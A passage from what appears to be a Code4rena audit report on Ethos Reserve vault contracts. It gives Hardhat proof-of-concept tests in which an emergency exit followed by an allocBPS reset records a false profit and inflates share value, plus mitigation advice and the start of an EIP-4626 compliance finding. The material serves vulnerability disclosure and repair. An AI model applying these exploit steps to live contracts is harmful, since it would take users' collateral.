class=\"grvsc-line\"><span class=\"grvsc-source\">  // Treasury owned asset value starts with zero</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  const treasurySharesBefore = await vault.balanceOf(treasuryAddr);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  const treasuryAssetsBefore = await vault.convertToAssets(treasurySharesBefore);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  expect(treasuryAssetsBefore).to.equal(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // ActivePool deposits 10 WBTC </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  await vault.connect(wantHolder)[&#39;deposit(uint256)&#39;](toWantUnit(&#39;10&#39;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  await strategy.harvest();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // Expect ActivePool&#39;s owned share and asset to be equal to 10 WBTC as deposited</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  const activePoolSharesBefore = await vault.balanceOf(wantHolder.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  const activePoolAssetsBefore = await vault.convertToAssets(activePoolSharesBefore);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  expect(activePoolSharesBefore).to.equal(toWantUnit(&#39;10&#39;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  expect(activePoolAssetsBefore).to.equal(toWantUnit(&#39;10&#39;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  /* Guardian calls setEmergencyExit().</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  *  This triggers Vault to revokeStrategy() and set strategy&#39;s allocBPS to 0.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  *  By design, this will force strategy to exit all its position and </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  *  return funds to vault in the next harvest().</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  await strategy.connect(guardian).setEmergencyExit();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  /* Strategist set AllocBPS back to 10000 (100%). </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  *  This will reverse the revokeStrategy() and cause strategy&#39;s debt value </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  *  to be reduced in next harvest()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  await vault.connect(strategist).updateStrategyAllocBPS(strategy.address, 10000);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  /* Strategy will liquidate all its position due to emergency exit state.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  * However, it will also record an incorrect profit due to reduced debt value.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  await strategy.harvest();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // Jump ahead for incorrect profit to unlock</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  await moveTimeForward(3600*7);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // Treasury will gain fees of 1.56 WBTC on the incorrect profit value</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  const treasurySharesAfter = await vault.balanceOf(treasuryAddr);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  const treasuryAssetsAfter = await vault.convertToAssets(treasurySharesAfter);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  expect(treasuryAssetsAfter).to.not.equal(treasuryAssetsBefore);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  expect(treasuryAssetsAfter).to.equal(156880733);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // ActivePool&#39;s owned asset value is incorrectly inflated </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // This is due to increased share price from the incorrect profit and wrong accounting from allocBPS</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  const activePoolSharesAfter = await vault.balanceOf(wantHolder.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  const activePoolAssetsAfter = await vault.convertToAssets(activePoolSharesAfter);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  expect(activePoolAssetsAfter).to.equal(&quot;1743119266&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  expect(activePoolAssetsAfter).to.not.equal(activePoolAssetsBefore);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  /* ActivePool will record a profit of 7.43 WBTC (74% of initial deposit) due to the inflated asset value</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  *  In the next ActivePool&#39;s _rebalance(), the  incorrect profit will be distributed to Treasury, </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  *  Staking Pool and StabilityPool. </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  *  Depositors and Stakers will be able to withdraw the profits, leading to loss of borrowers&#39;s collateral.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  const estimatedActivePoolProfit = activePoolAssetsAfter - activePoolAssetsBefore;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  expect(estimatedActivePoolProfit).to.be.equal(743119266);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">});</span></span></code></pre>\n<p>Add the following test case to <code>Ethos-Core/test/PoolsTest.js</code>. Note that this is an  test independent from the preivous test case just to show that ActivePool will record a profit when the share asset value increases, and the profit will be distributed to the respective pools.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">it.only(&#39;simulate incorrect profit to show that _rebalance() called by sendCollateral() will distributes profit&#39;, async () =&gt; {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tawait setReasonableDefaultStateForYielding();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t// Simulate incorrect profit: mint 1 ether to vault.  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t// This will increase the vault share price and inflate the ActivePool&#39;s owned asset value.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tawait collaterals[0].mint(vaults[0].address, dec(1, &#39;ether&#39;))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t// Trigger ActivePool&#39;s _rebalance() via sendCollateral(). </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t// ActivePool will record a profit due to the inflated owned asset value.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tconst sendCollData = th.getTransactionData(&#39;sendCollateral(address,address,uint256)&#39;, </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t  [collaterals[0].address, alice, web3.utils.toHex(dec(1, &#39;ether&#39;))])</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tawait mockBorrowerOperations.forward(activePool.address, sendCollData, { from: owner })</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t// The incorrect profit will be distributed to Treasury, StabilityPool and Staking Pool</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tassert.equal((await collaterals[0].balanceOf(treasury.address)).toString(), &#39;200000000000000000&#39;) // 0.2 ether</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tassert.equal((await collaterals[0].balanceOf(stabilityPool.address)).toString(), &#39;300000000000000000&#39;) // 0.3 ether</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tassert.equal((await collaterals[0].balanceOf(lqtyStaking.address)).toString(), &#39;500000000000000000&#39;) // 0.5 ether</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">})</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The fix is to block all changes to strategy’s <code>allocBPS</code> after <code>setEmergencyExit()</code>.</p>\n<p>Since <code>allocBPS</code> is already tracked within <code>ReaperVaultV2.sol</code>, it is better to refactor and shift <code>emergencyExit</code> from <code>ReaperBaseStrategyv4.sol</code> to <code>ReaperVaultV2.StrategyParams</code>. With that, the fix can simply just to add a check for emergency exit within <code>updateStrategyAllocBPS()</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/716#issuecomment-1468447370\">tess3rac7 (Ethos Reserve) disagreed with severity, but confirmed via duplicate issue <code>#716</code></a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/255#issuecomment-1476499490\">Trust (judge) decreased severity to Medium</a></strong></p>\n<hr>\n<h2 id=\"m-12-reapervaulterc4626-is-not-eip-4626-compliant-and-integrations-can-result-in-loss-of-funds\" style=\"position:relative;\"><a href=\"#m-12-reapervaulterc4626-is-not-eip-4626-compliant-and-integrations-can-result-in-loss-of-funds\" aria-label=\"m 12 reapervaulterc4626 is not eip 4626 compliant and integrations can result in loss of funds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/247\">[M-12] ReaperVaultERC4626 is not EIP-4626 compliant and integrations can result in loss of funds</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/247\">DadeKuma</a>, also found by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/861\">rbserver</a></em></p>\n<p>Contracts that integrate with the <code>ReaperVaultERC4626</code> vault (including Ethos contracts) may wrongly assume that the functions are EIP-4626 compliant, which it might cause integration problems in the future, that can lead to a wide range of issues for both parties, including loss of funds.</p>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This PoC describes this issue for the <code>withdraw</code> function, but there is the same problem with the <code>redeem</code> function.</p>\n<p>EIP-4626 specification says that the <code>withdraw</code> function:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// Burns shares from owner and sends exactly assets of underlying tokens to receiver.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// MUST revert if all of assets cannot be withdrawn (due to withdrawal limit being reached, slippage,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// the owner not having enough shares, etc).</span></span></code></pre>\n<p>This is the <code>withdraw</code> function:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ReaperVaultERC4626</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">202</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">203:         </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">assets</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">204:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">receiver</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">205:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">206</span><span class=\"mtk1\">:     ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">207</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">previewWithdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// previewWithdraw() rounds up so exactly &quot;assets&quot; are withdrawn and not 1 wei less</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">208</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">) </span><span class=\"mtk11\">_spendAllowance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">209</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">_withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shares</span><span class=\"mtk1\">, </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">210</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>When the internal <code>_withdraw</code> is called, the <code>value</code> represents the total amount of assets that will be transferred to the receiver.\nThere is a special case where there could be a withdrawal that exceeds the total balance of the vault:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">368</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">))) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">369</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalLoss</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">370</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">queueLength</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">withdrawalQueue</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">371</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">372</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">queueLength</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uncheckedInc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">373</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">374</span><span class=\"mtk1\">:                 </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">375</span><span class=\"mtk1\">:                     </span><span class=\"mtk15\">break</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">376</span><span class=\"mtk1\">:                 }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">377</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">378</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">withdrawalQueue</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">379</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategyBal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">[</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allocated</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">380</span><span class=\"mtk1\">:                 </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">strategyBal</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">381</span><span class=\"mtk1\">:                     </span><span class=\"mtk15\">continue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">382</span><span class=\"mtk1\">:                 }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">383</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">384</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">remaining</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">385</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">loss</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IStrategy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\">).</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk10\">Math</span><span class=\"mtk1\">.</span><span class=\"mtk11\">min</span><span class=\"mtk1\">(</span><span class=\"mtk12\">remaining</span><span class=\"mtk1\">, </span><span class=\"mtk12\">strategyBal</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">386</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">actualWithdrawn</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) - </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">387</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">388</span><span class=\"mtk1\">:                 </span><span class=\"mtk3\">// Withdrawer incurs any losses from withdrawing as reported by strat</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">389</span><span class=\"mtk1\">:                 </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">loss</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">390</span><span class=\"mtk1\">:                     </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">loss</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">391</span><span class=\"mtk1\">:                     </span><span class=\"mtk12\">totalLoss</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">loss</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">392</span><span class=\"mtk1\">:                     </span><span class=\"mtk11\">_reportLoss</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">loss</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">393</span><span class=\"mtk1\">:                 }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">394</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">395</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">[</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allocated</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">actualWithdrawn</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">396</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">totalAllocated</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">actualWithdrawn</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">397</span><span class=\"mtk1\">:             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">398</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">399</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">400</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">401</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">402</span><span class=\"mtk1\">:             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">403</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">404</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span 